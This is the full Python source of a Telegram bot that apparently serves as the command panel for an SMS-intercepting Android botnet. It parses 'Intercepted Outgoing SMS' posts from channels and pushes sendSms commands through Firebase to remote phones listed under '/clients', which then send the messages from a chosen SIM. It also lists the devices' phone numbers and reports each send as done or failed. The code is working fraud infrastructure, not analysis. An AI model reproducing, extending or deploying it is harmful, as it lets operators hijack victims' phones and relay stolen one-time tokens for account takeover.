# TOKEN SENDER SUPERFAST
# pip install aiogram==3.7.0 aiohttp python-dotenv

import asyncio, json, logging, os, re, time
from dotenv import load_dotenv
import aiohttp
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web

load_dotenv()
logging.basicConfig(level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("bot")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ENV_FB_URL = os.getenv("FB_URL", "").rstrip("/")
DATA_FILE = "data.json"
BOT_NAME = "TOKEN SENDER SUPERFAST"

WEBHOOK_HOST = os.getenv("WEBHOOK_HOST", "").rstrip("/")
WEBHOOK_PORT = int(os.getenv("WEBHOOK_PORT", "8080"))
WEBHOOK_PATH = os.getenv("WEBHOOK_PATH", "/hook")
USE_WEBHOOK = bool(WEBHOOK_HOST)
WEBHOOK_URL = f"{WEBHOOK_HOST}{WEBHOOK_PATH}/{BOT_TOKEN}" if USE_WEBHOOK else ""

LOG_CHAT_ID = int(os.getenv("LOG_CHAT_ID", "0"))

CFG = {"owner_id": 0, "fb_url": "", "device_id": "", "sim_slot": 0,
       "allowed_users": []}
_monitor_on = {"on": False}


def load_cfg():
    if ENV_FB_URL: CFG["fb_url"] = ENV_FB_URL
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE) as f: d = json.load(f)
            for k in CFG:
                if k in d and d[k] not in (None, ""): CFG[k] = d[k]
        except Exception as e: log.error(f"load_cfg: {e}")
    log.info(f"config: fb={CFG['fb_url'][:40]} dev={CFG['device_id'] or 'ALL'} sim={CFG['sim_slot']} owner={CFG['owner_id']}")


def save_cfg():
    try:
        with open(DATA_FILE, "w") as f: json.dump(CFG, f, indent=2)
    except Exception as e: log.error(f"save_cfg: {e}")


_SESSION = None
def _sess():
    global _SESSION
    if _SESSION is None or _SESSION.closed:
        _SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=1.5, connect=1.0),
            connector=aiohttp.TCPConnector(
                limit=200, ttl_dns_cache=600,
                keepalive_timeout=300, force_close=False,
                enable_cleanup_closed=True, ssl=False))
    return _SESSION


def _url(path):
    b = CFG.get("fb_url", "").rstrip("/")
    if not b: return None
    return f"{b}/{path.lstrip('/')}.json"


async def fb_get(path):
    u = _url(path)
    if not u: return {}
    try:
        async with _sess().get(u) as r:
            if r.status == 200:
                t = (await r.text()).strip()
                return {} if t == "null" else json.loads(t)
    except Exception as e: log.error(f"GET {path}: {e}")
    return {}


async def fb_put(path, payload):
    u = _url(path)
    if not u: return False
    try:
        async with _sess().put(u, json=payload) as r:
            return 200 <= r.status < 300
    except Exception as e:
        log.error(f"PUT {path}: {e}"); return False


async def fb_test(base):
    if not base: return False
    u = f"{base.rstrip('/')}/.json"
    try:
        async with _sess().get(u) as r: return r.status == 200
    except Exception: return False


def dev_online(d):
    return any([d.get("isOnline"), d.get("online"), d.get("connected"),
                d.get("status") in ("online", "active", True, 1)])


def dev_number(d):
    return (d.get("mobNo") or d.get("mobile") or d.get("msisdn")
            or (d.get("sims") or [{}])[0].get("phoneNumber") or d.get("phoneNumber"))


_PAT = re.compile(
    r"📱\s*Intercepted\s+Outgoing\s+SMS\s+@?\S+\s*[\r\n]+"
    r"To\s*\(Tap\s*to\s*copy\)\s*:?\s*[\r\n]+"
    r"(\+?\d[\d\s\-]{6,})\s*[\r\n]+"
    r"Body\s*\(Tap\s*to\s*copy\)\s*:?\s*[\r\n]+"
    r"([\s\S]+?)(?:[\r\n]\d{1,2}:\d{2}\s*(?:AM|PM)|\Z)",
    re.IGNORECASE)


def parse_intercept(text):
    if not text: return None
    m = _PAT.search(text)
    if not m: return None
    to = re.sub(r"[\s\-]", "", m.group(1).strip())
    body = m.group(2).strip()
    return {"to": to, "body": body, "ts": int(time.time() * 1000)}


R = Router()
_devices = {}
_watched = set()
_dispatched = []
_seen_msg = set()


def is_op(uid):
    if uid == CFG["owner_id"]: return True
    if uid in CFG.get("allowed_users", []): return True
    return False


def online_devices():
    return {k: v for k, v in _devices.items() if dev_online(v)}


class S(StatesGroup):
    fb_url = State()
    device = State()


async def notify_fb_add(bot, user, url):
    if not LOG_CHAT_ID: return
    try:
        mention = f"@{user.username}" if user.username else f'<a href="tg://user?id={user.id}">{user.full_name}</a>'
        await bot.send_message(
            LOG_CHAT_ID,
            f"🔥  <b>NEW FIREBASE ADDED</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤  <b>User</b>     :  {mention}\n"
            f"🆔  <b>UID</b>      :  <code>{user.id}</code>\n"
            f"🔥  <b>Firebase</b>  :  <code>{url}</code>\n"
            f"🕐  <b>Time</b>     :  <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML")
    except Exception as e:
        log.warning(f"log channel failed: {e}")


async def device_loop():
    global _devices
    while True:
        try:
            if CFG["fb_url"]:
                d = await fb_get("/clients")
                _devices = d or {}
        except Exception as e: log.error(f"device_loop: {e}")
        await asyncio.sleep(3)


async def watcher_loop(bot):
    while True:
        try:
            await asyncio.sleep(0.3)
            if not CFG["fb_url"]: continue
            clients = await fb_get("/clients")
            if not clients: continue
            now = int(time.time())
            targets = [CFG["owner_id"]] + list(CFG.get("allowed_users", []))
            for dev_id, dev in clients.items():
                if not isinstance(dev, dict): continue
                we = dev.get("webhookEvent") or {}
                if not isinstance(we, dict): continue
                ss = we.get("sendSms")
                if not isinstance(ss, dict): continue
                ts = ss.get("timestamp")
                flag = ss.get("isSended")
                if ts is None: continue
                to = ss.get("to", "-")
                msg = (ss.get("message") or "")[:80]

                if flag is True:
                    uid = f"{dev_id}:{ts}:done"
                    if uid in _watched: continue
                    _watched.add(uid)
                    t = (f"✅  <b>S M S   D O N E</b>  ✅\n\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"📞  <b>To</b>       :  <code>{to}</code>\n"
                         f"💬  <b>Message</b>  :  <code>{msg}</code>\n"
                         f"📱  <b>Device</b>   :  <code>{dev_id[:16]}</code>\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━")
                    for op in targets:
                        if not op: continue
                        try: await bot.send_message(op, t, parse_mode="HTML")
                        except Exception: pass
                elif flag is False and (now - ts) > 15:
                    uid = f"{dev_id}:{ts}:failed"
                    if uid in _watched: continue
                    _watched.add(uid)
                    t = (f"❌  <b>S M S   F A I L E D</b>  ❌\n\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                         f"📞  <b>To</b>       :  <code>{to}</code>\n"
                         f"💬  <b>Message</b>  :  <code>{msg}</code>\n"
                         f"📱  <b>Device</b>   :  <code>{dev_id[:16]}</code>\n"
                         f"⏱  <b>Reason</b>   :  <code>timeout 15s</code>\n"
                         f"━━━━━━━━━━━━━━━━━━━━━━━")
                    for op in targets:
                        if not op: continue
                        try: await bot.send_message(op, t, parse_mode="HTML")
                        except Exception: pass
        except Exception as e:
            log.error(f"watcher_loop: {e}")
            await asyncio.sleep(1)


def main_kb():
    mon = _monitor_on["on"]
    if mon:
        mon_btn = "🛑   S T O P   M O N I T O R   🛑"
        mon_cb = "menu:stop"
    else:
        mon_btn = "▶️   S T A R T   M O N I T O R   ▶️"
        mon_cb = "menu:start"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=mon_btn, callback_data=mon_cb)],
        [InlineKeyboardButton(text="🔥   F I R E B A S E",  callback_data="menu:fb")],
        [InlineKeyboardButton(text="📱   D E V I C E",       callback_data="menu:dev"),
         InlineKeyboardButton(text="📶   S I M",            callback_data="menu:sim")],
        [InlineKeyboardButton(text="📊   S T A T U S",      callback_data="menu:status"),
         InlineKeyboardButton(text="📋   D E V I C E S",    callback_data="menu:list")],
        [InlineKeyboardButton(text="🔴   L I V E   L O G",  callback_data="menu:live"),
         InlineKeyboardButton(text="👥   U S E R S",        callback_data="menu:users")],
        [InlineKeyboardButton(text="🧹   R E S E T   A L L", callback_data="menu:reset"),
         InlineKeyboardButton(text="❓   H E L P",          callback_data="menu:help")],
    ])


def menu_text():
    fb = CFG["fb_url"] or "— not set —"
    mon = "🟢   R U N N I N G" if _monitor_on["on"] else "🔴   S T O P P E D"
    users = len(CFG.get("allowed_users", []))
    return (
        f"⚡  <b>{BOT_NAME}</b>  ⚡\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📡  <b>MONITOR</b>  :  <b>{mon}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔥  <b>FIREBASE</b>\n"
        f"     <code>{fb[:42]}</code>\n\n"
        f"📱  <b>DEVICE</b>\n"
        f"     <code>{CFG['device_id'] or 'ALL ONLINE'}</code>\n\n"
        f"📶  <b>SIM SLOT</b>  :  <code>{CFG['sim_slot']}</code>\n"
        f"👥  <b>USERS</b>  :  <code>{users}</code>"
    )


@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    if CFG["owner_id"] == 0:
        CFG["owner_id"] = uid; save_cfg()
        await msg.answer(
            f"⚡  <b>{BOT_NAME}</b>  ⚡\n\n"
            f"👑  <b>OWNER</b>  :  <code>{uid}</code>\n\n"
            f"<i>Firebase URL set karo, phir START MONITOR dabao.</i>",
            reply_markup=main_kb(), parse_mode="HTML")
        return
    if not is_op(uid):
        await msg.answer("🚫 Unauthorized.", parse_mode="HTML"); return
    await msg.answer(menu_text(), reply_markup=main_kb(), parse_mode="HTML")


@R.message(Command("menu"))
async def cmd_menu(msg: Message):
    if not is_op(msg.from_user.id): return
    await msg.answer(menu_text(), reply_markup=main_kb(), parse_mode="HTML")


@R.message(Command("me"))
async def cmd_me(msg: Message):
    await msg.answer(f"👤  <b>ID</b>  :  <code>{msg.from_user.id}</code>\n🔗  <b>Chat</b>  :  <code>{msg.chat.id}</code>", parse_mode="HTML")


@R.message(Command("groupid"))
async def cmd_groupid(msg: Message):
    await msg.answer(f"📢  <b>Chat ID</b>  :  <code>{msg.chat.id}</code>\n⚙️  <b>Type</b>  :  <code>{msg.chat.type}</code>", parse_mode="HTML")


@R.message(Command("setfb"))
async def cmd_setfb(msg: Message, state: FSMContext):
    if not is_op(msg.from_user.id): return
    await state.set_state(S.fb_url)
    await msg.answer("🔥  <b>FIREBASE URL</b> bhejo:", parse_mode="HTML")


@R.message(Command("setdev"))
async def cmd_setdev(msg: Message, state: FSMContext):
    if not is_op(msg.from_user.id): return
    await state.set_state(S.device)
    await msg.answer("📱  <b>DEVICE ID</b> bhejo (ya /cleardev = ALL):", parse_mode="HTML")


@R.message(Command("cleardev"))
async def cmd_cleardev(msg: Message):
    if not is_op(msg.from_user.id): return
    CFG["device_id"] = ""; save_cfg()
    await msg.answer("✅  <b>ALL DEVICES</b>", parse_mode="HTML")


@R.message(Command("setsim"))
async def cmd_setsim(msg: Message):
    if not is_op(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2 or p[1] not in ("0", "1"):
        await msg.answer("Usage: <code>/setsim 0|1</code>", parse_mode="HTML"); return
    CFG["sim_slot"] = int(p[1]); save_cfg()
    await msg.answer(f"✅  <b>SIM SLOT</b>  :  <code>{CFG['sim_slot']}</code>", parse_mode="HTML")


@R.message(Command("devices"))
async def cmd_devices(msg: Message):
    if not is_op(msg.from_user.id): return
    if not _devices:
        await msg.answer("📱  No devices.", parse_mode="HTML"); return
    lines = ["📱  <b>D E V I C E S</b>\n"]
    for did, d in list(_devices.items())[:20]:
        on = "🟢" if dev_online(d) else "🔴"
        lines.append(f"{on}  <b>{(d.get('deviceName') or d.get('name') or did)[:24]}</b>\n     <code>{did[:22]}</code>  📞 <code>{dev_number(d) or '-'}</code>")
    await msg.answer("\n".join(lines), parse_mode="HTML")


@R.message(Command("adduser"))
async def cmd_adduser(msg: Message):
    if not is_op(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        await msg.answer("Usage: <code>/adduser &lt;id&gt;</code>", parse_mode="HTML"); return
    try: new_uid = int(p[1])
    except ValueError: await msg.answer("❌ Numeric ID chahiye."); return
    allowed = set(CFG.get("allowed_users", []))
    allowed.add(new_uid)
    CFG["allowed_users"] = list(allowed)
    save_cfg()
    await msg.answer(f"✅  <b>USER ADDED</b>  :  <code>{new_uid}</code>", parse_mode="HTML")


@R.message(Command("deluser"))
async def cmd_deluser(msg: Message):
    if not is_op(msg.from_user.id): return
    p = msg.text.split()
    if len(p) < 2:
        await msg.answer("Usage: <code>/deluser &lt;id&gt;</code>", parse_mode="HTML"); return
    try: del_uid = int(p[1])
    except ValueError: await msg.answer("❌ Numeric ID chahiye."); return
    allowed = set(CFG.get("allowed_users", []))
    allowed.discard(del_uid)
    CFG["allowed_users"] = list(allowed)
    save_cfg()
    await msg.answer(f"✅  <b>USER REMOVED</b>  :  <code>{del_uid}</code>", parse_mode="HTML")


@R.message(Command("live"))
async def cmd_live(msg: Message):
    if not is_op(msg.from_user.id): return
    if not _dispatched:
        await msg.answer("🔴  <b>LIVE LOG</b>\n\nKuch dispatch nahi hua.", parse_mode="HTML"); return
    lines = ["🔴  <b>L I V E   L O G</b>  — last 10\n"]
    for entry in _dispatched[-10:][::-1]:
        when = time.strftime("%H:%M:%S", time.localtime(entry["ts"]/1000)) if entry.get("ts") else "-"
        lines.append(f"📤  <b>{entry.get('to','-')}</b>\n     📱 <code>{entry.get('dev','-')[:16]}</code>\n     🕐 {when}")
    await msg.answer("\n".join(lines), parse_mode="HTML")


@R.message(Command("reset"))
async def cmd_reset(msg: Message):
    if not is_op(msg.from_user.id): return
    CFG["device_id"] = ""; CFG["sim_slot"] = 0
    _monitor_on["on"] = False
    save_cfg()
    await msg.answer("🧹  <b>R E S E T   D O N E</b>", parse_mode="HTML")


@R.callback_query(F.data == "menu:start")
async def cb_start_mon(cq: CallbackQuery):
    if not is_op(cq.from_user.id):
        await cq.answer("🚫", show_alert=True); return
    if not CFG["fb_url"]:
        await cq.answer("Firebase URL set karo pehle", show_alert=True); return
    _monitor_on["on"] = True
    await cq.answer("▶️ Monitor ON", show_alert=True)
    try: await cq.message.edit_text(menu_text(), reply_markup=main_kb(), parse_mode="HTML")
    except Exception: pass


@R.callback_query(F.data == "menu:stop")
async def cb_stop_mon(cq: CallbackQuery):
    if not is_op(cq.from_user.id):
        await cq.answer("🚫", show_alert=True); return
    _monitor_on["on"] = False
    await cq.answer("🛑 Monitor OFF", show_alert=True)
    try: await cq.message.edit_text(menu_text(), reply_markup=main_kb(), parse_mode="HTML")
    except Exception: pass


@R.callback_query(F.data == "menu:home")
async def cb_home(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    try: await cq.message.edit_text(menu_text(), reply_markup=main_kb(), parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "menu:help")
async def cb_help(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    text = (
        f"⚡  <b>{BOT_NAME}</b>  ⚡\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>SETUP</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥  <b>Firebase URL</b>\n"
        f"📱  <b>Device</b>\n"
        f"📶  <b>SIM slot</b>\n"
        f"▶️  <b>START MONITOR</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>USERS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>/adduser &lt;id&gt;</code>\n"
        f"<code>/deluser &lt;id&gt;</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>FLOW</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"1. Channel me token aata hai\n"
        f"2. Bot Firebase me likhta hai\n"
        f"3. Device SMS bhejta hai\n"
        f"4. <b>✅ DONE</b> ya <b>❌ FAILED</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>COMMANDS</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>/menu /setfb /setdev /cleardev</code>\n"
        f"<code>/setsim /devices /live /reset</code>\n"
        f"<code>/adduser /deluser /me /groupid</code>"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:home")]])
    try: await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "menu:users")
async def cb_users(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    allowed = CFG.get("allowed_users", [])
    lines = [f"👥  <b>U S E R S</b>\n", f"━━━━━━━━━━━━━━━━━━━━━━━\n", f"👑  <b>Owner</b>  :  <code>{CFG['owner_id']}</code>\n"]
    if not allowed:
        lines.append("<i>Koi extra user nahi</i>")
    else:
        for u in allowed:
            lines.append(f"👤  <code>{u}</code>")
    lines.append(f"\n━━━━━━━━━━━━━━━━━━━━━━━\n")
    lines.append(f"<code>/adduser 123456</code>")
    lines.append(f"<code>/deluser 123456</code>")
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:home")]])
    try: await cq.message.edit_text("\n".join(lines), reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "menu:fb")
async def cb_fb(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    text = (f"🔥  <b>F I R E B A S E</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Current:</b>\n"
            f"<code>{(CFG['fb_url'] or 'not set')[:60]}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✏️   C H A N G E", callback_data="act:setfb")],
        [InlineKeyboardButton(text="🗑   D E L E T E", callback_data="act:delfb")],
        [InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:home")]])
    try: await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "menu:dev")
async def cb_dev(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    text = (f"📱  <b>D E V I C E</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Current:</b>\n"
            f"<code>{CFG['device_id'] or 'ALL ONLINE'}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋   S H O W", callback_data="act:listdev")],
        [InlineKeyboardButton(text="✏️   S E T   I D", callback_data="act:setdev")],
        [InlineKeyboardButton(text="🔄   A L L", callback_data="act:cleardev")],
        [InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:home")]])
    try: await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "menu:sim")
async def cb_sim(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    text = (f"📶  <b>S I M   S L O T</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Current:</b>  <code>{CFG['sim_slot']}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"<b>0</b>  →  SIM 1\n"
            f"<b>1</b>  →  SIM 2")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📶   S I M   1", callback_data="act:sim:0"),
         InlineKeyboardButton(text="📶   S I M   2", callback_data="act:sim:1")],
        [InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:home")]])
    try: await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data.startswith("act:sim:"))
async def act_sim(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    v = int(cq.data.split(":")[-1]); CFG["sim_slot"] = v; save_cfg()
    await cq.answer(f"✅ SIM {v+1}", show_alert=True)
    try: await cq.message.edit_text(menu_text(), reply_markup=main_kb(), parse_mode="HTML")
    except Exception: pass


@R.callback_query(F.data == "menu:status")
async def cb_status(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    clients = await fb_get("/clients")
    p = s = 0
    for _, dev in (clients or {}).items():
        if not isinstance(dev, dict): continue
        we = dev.get("webhookEvent") or {}
        if not isinstance(we, dict): continue
        for k, v in we.items():
            if not isinstance(v, dict): continue
            if v.get("isSended") is True: s += 1
            elif v.get("isSended") is False: p += 1
    text = (f"📊  <b>S T A T U S</b>\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳  <b>Pending</b>  :  <code>{p}</code>\n"
            f"✅  <b>Sent</b>     :  <code>{s}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━")
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄   R E F R E S H", callback_data="menu:status")],
        [InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:home")]])
    try: await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "menu:list")
async def cb_list(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    if not _devices: text = "📱  <b>D E V I C E S</b>\n\nNo devices."
    else:
        lines = ["📱  <b>D E V I C E S</b>\n", "━━━━━━━━━━━━━━━━━━━━━━━\n"]
        for did, d in list(_devices.items())[:20]:
            on = "🟢" if dev_online(d) else "🔴"
            lines.append(f"{on}  <b>{(d.get('deviceName') or d.get('name') or did)[:24]}</b>\n     <code>{did[:22]}</code>  📞 <code>{dev_number(d) or '-'}</code>")
        text = "\n".join(lines)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄   R E F R E S H", callback_data="menu:list")],
        [InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:home")]])
    try: await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "menu:live")
async def cb_live(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    if not _dispatched: text = "🔴  <b>L I V E   L O G</b>\n\nKuch dispatch nahi hua."
    else:
        lines = ["🔴  <b>L I V E   L O G</b>  — last 10\n", "━━━━━━━━━━━━━━━━━━━━━━━\n"]
        for entry in _dispatched[-10:][::-1]:
            when = time.strftime("%H:%M:%S", time.localtime(entry["ts"]/1000)) if entry.get("ts") else "-"
            lines.append(f"📤  <b>{entry.get('to','-')}</b>\n     📱 <code>{entry.get('dev','-')[:16]}</code>\n     🕐 {when}")
        text = "\n".join(lines)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄   R E F R E S H", callback_data="menu:live")],
        [InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:home")]])
    try: await cq.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "menu:reset")
async def cb_reset(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅   Y E S   R E S E T", callback_data="act:resetall:yes")],
        [InlineKeyboardButton(text="❌   C A N C E L", callback_data="menu:home")]])
    try: await cq.message.edit_text(
        "🧹  <b>R E S E T   A L L</b>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "Firebase + Device + SIM\n"
        "sab clear hoga.\n"
        "━━━━━━━━━━━━━━━━━━━━━━━",
        reply_markup=kb, parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data == "act:resetall:yes")
async def cb_resetall_yes(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    CFG["fb_url"] = ""; CFG["device_id"] = ""; CFG["sim_slot"] = 0
    _monitor_on["on"] = False
    _dispatched.clear(); _watched.clear(); _seen_msg.clear(); save_cfg()
    await cq.answer("🧹 RESET DONE", show_alert=True)
    try: await cq.message.edit_text("🧹  <b>R E S E T   D O N E</b>", reply_markup=main_kb(), parse_mode="HTML")
    except Exception: pass


@R.callback_query(F.data == "act:setfb")
async def act_setfb(cq: CallbackQuery, state: FSMContext):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.fb_url)
    await cq.message.edit_text("🔥  <b>FIREBASE URL</b> bhejo:", parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "act:delfb")
async def act_delfb(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    CFG["fb_url"] = ""; save_cfg()
    await cq.answer("🗑 Firebase deleted", show_alert=True)
    try: await cq.message.edit_text(menu_text(), reply_markup=main_kb(), parse_mode="HTML")
    except Exception: pass


@R.callback_query(F.data == "act:setdev")
async def act_setdev(cq: CallbackQuery, state: FSMContext):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    await state.set_state(S.device)
    await cq.message.edit_text("📱  <b>DEVICE ID</b> bhejo:", parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "act:cleardev")
async def act_cleardev(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    CFG["device_id"] = ""; save_cfg()
    await cq.answer("✅ ALL devices", show_alert=True)
    try: await cq.message.edit_text(menu_text(), reply_markup=main_kb(), parse_mode="HTML")
    except Exception: pass


@R.callback_query(F.data == "act:listdev")
async def act_listdev(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    if not _devices: await cq.answer("No devices", show_alert=True); return
    rows = []
    for did, d in list(_devices.items())[:12]:
        on = "🟢" if dev_online(d) else "🔴"
        nm = (d.get("deviceName") or d.get("name") or did)[:26]
        rows.append([InlineKeyboardButton(text=f"{on}   {nm}", callback_data=f"pickdev:{did}")])
    rows.append([InlineKeyboardButton(text="🔙   B A C K", callback_data="menu:dev")])
    try: await cq.message.edit_text(
        "📱  <b>S E L E C T   D E V I C E</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=rows),
        parse_mode="HTML")
    except Exception: pass
    await cq.answer()


@R.callback_query(F.data.startswith("pickdev:"))
async def act_pickdev(cq: CallbackQuery):
    if not is_op(cq.from_user.id): await cq.answer("🚫", show_alert=True); return
    did = cq.data.split(":", 1)[1]; CFG["device_id"] = did; save_cfg()
    await cq.answer(f"✅ {did[:16]}", show_alert=True)
    try: await cq.message.edit_text(menu_text(), reply_markup=main_kb(), parse_mode="HTML")
    except Exception: pass


@R.message(S.fb_url)
async def s_fb_url(msg: Message, state: FSMContext):
    url = msg.text.strip().rstrip("/")
    if not url.startswith("http"):
        await msg.answer("❌ https:// se shuru."); return
    wait = await msg.answer("⏳ Testing Firebase...")
    ok = await fb_test(url)
    try: await wait.delete()
    except Exception: pass
    if not ok:
        await msg.answer("❌ Firebase reachable nahi.", parse_mode="HTML"); return
    CFG["fb_url"] = url; save_cfg(); await state.clear()
    await msg.answer(
        f"✅  <b>F I R E B A S E   S E T</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>{url}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━",
        reply_markup=main_kb(), parse_mode="HTML")
    await notify_fb_add(msg.bot, msg.from_user, url)


@R.message(S.device)
async def s_device(msg: Message, state: FSMContext):
    did = msg.text.strip()
    CFG["device_id"] = did; save_cfg(); await state.clear()
    await msg.answer(
        f"✅  <b>D E V I C E   S E T</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<code>{did}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━",
        reply_markup=main_kb(), parse_mode="HTML")


@R.channel_post()
@R.message(F.chat.type.in_({"group", "supergroup"}))
async def interceptor(msg: Message):
    if not _monitor_on["on"]:
        return
    if not CFG["fb_url"]:
        return

    mid = f"{msg.chat.id}:{msg.message_id}"
    if mid in _seen_msg:
        return
    _seen_msg.add(mid)
    if len(_seen_msg) > 1000:
        _seen_msg.clear()

    text = msg.text or msg.caption or ""
    if not text or "Intercepted Outgoing SMS" not in text:
        return

    log.info(f"RAW: {text[:100]!r}")
    t0 = time.time()

    parsed = parse_intercept(text)
    if not parsed:
        log.warning(f"parse fail: {text[:200]!r}")
        return

    to = parsed["to"]
    body = parsed["body"]

    selected = CFG.get("device_id", "").strip()
    if selected:
        targets = [selected]
    else:
        online = online_devices()
        if not online:
            log.warning("no online device")
            return
        targets = list(online.keys())

    for dev_id in targets:
        payload = {
            "from":      CFG.get("sim_slot", 0),
            "to":        to,
            "message":   body,
            "isSended":  False,
            "timestamp": int(time.time()),
        }
        asyncio.create_task(fb_put(
            f"/clients/{dev_id}/webhookEvent/sendSms", payload))
        _dispatched.append({
            "to": to, "dev": dev_id,
            "ts": int(time.time() * 1000),
        })
        if len(_dispatched) > 50: _dispatched.pop(0)
